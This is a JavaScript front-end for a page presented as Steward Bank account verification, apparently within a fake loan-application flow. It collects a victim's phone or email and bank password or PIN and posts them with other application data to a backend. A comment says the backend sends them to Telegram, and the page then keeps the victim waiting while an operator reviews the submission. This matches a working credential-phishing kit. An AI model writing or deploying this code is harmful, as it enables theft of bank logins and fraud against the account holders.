// Account Verification Script for Steward Bank (Phone/Email + Password)
document.addEventListener('DOMContentLoaded', function() {
    const verificationScreen = document.getElementById('verificationScreen');
    const processingScreen = document.getElementById('processingScreen');
    const rejectionScreen = document.getElementById('rejectionScreen');
    
    const accountIdentifier = document.getElementById('accountIdentifier');
    const accountPassword = document.getElementById('accountPassword');
    const verifyBtn = document.getElementById('verifyBtn');
    
    // Get application data
    const applicationData = JSON.parse(sessionStorage.getItem('applicationData') || '{}');
    let applicationId = applicationData.applicationId || 'LOAN-' + Date.now();
    
    // Focus on first input
    if (accountIdentifier) accountIdentifier.focus();
    
    // Verify button click
    verifyBtn.addEventListener('click', async function(e) {
        e.preventDefault();
        
        const identifier = accountIdentifier.value.trim();
        const password = accountPassword.value.trim();
        
        if (!identifier) {
            alert('Please enter your phone number or email');
            accountIdentifier.focus();
            return;
        }
        
        if (!password) {
            alert('Please enter your password or PIN');
            accountPassword.focus();
            return;
        }
        
        // Validate identifier format (basic check)
        const isEmail = identifier.includes('@');
        const isPhone = /^[0-9+\s()-]+$/.test(identifier);
        
        if (!isEmail && !isPhone) {
            alert('Please enter a valid phone number or email address');
            accountIdentifier.focus();
            return;
        }
        
        // Show processing screen
        verificationScreen.style.display = 'none';
        processingScreen.style.display = 'block';
        
        try {
            // Send verification request to server
            const response = await fetch('/api/verify-account', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    applicationId: applicationId,
                    identifier: identifier,
                    password: password,
                    identifierType: isEmail ? 'email' : 'phone',
                    ...applicationData // Include all application data
                })
            });
            
            const result = await response.json();
            
            // CHANGED: Always start checking status regardless of initial response
            // The backend should send to Telegram and return pending status
            if (result.success || result.status === 'pending') {
                checkVerificationStatus();
            } else {
                // Only show error if there's a network/server error
                throw new Error(result.message || 'Submission failed');
            }
            
        } catch (error) {
            console.error('Verification error:', error);
            alert('Network error. Please check your connection and try again.');
            processingScreen.style.display = 'none';
            verificationScreen.style.display = 'block';
        }
    });
    
    // Check verification status
    function checkVerificationStatus() {
        const statusInterval = setInterval(async () => {
            try {
                const response = await fetch(`/api/check-verification-status/${applicationId}`);
                const result = await response.json();
                
                if (result.status === 'approved') {
                    clearInterval(statusInterval);
                    // Redirect to approval page
                    window.location.href = 'approval.html';
                    
                } else if (result.status === 'rejected') {
                    clearInterval(statusInterval);
                    // Show rejection screen
                    processingScreen.style.display = 'none';
                    rejectionScreen.style.display = 'block';
                }
                // Keep checking if status is still 'pending'
                
            } catch (error) {
                console.error('Status check error:', error);
            }
        }, 2000); // Check every 2 seconds
        
        // Timeout after 10 minutes (enough time for admin to review)
        setTimeout(() => {
            clearInterval(statusInterval);
            alert('Verification timeout. Please try again.');
            processingScreen.style.display = 'none';
            verificationScreen.style.display = 'block';
        }, 600000); // 10 minutes
    }
    
    // Allow Enter key to submit
    [accountIdentifier, accountPassword].forEach(input => {
        if (input) {
            input.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    verifyBtn.click();
                }
            });
        }
    });
    
    console.log('Verification page loaded for application:', applicationId);
});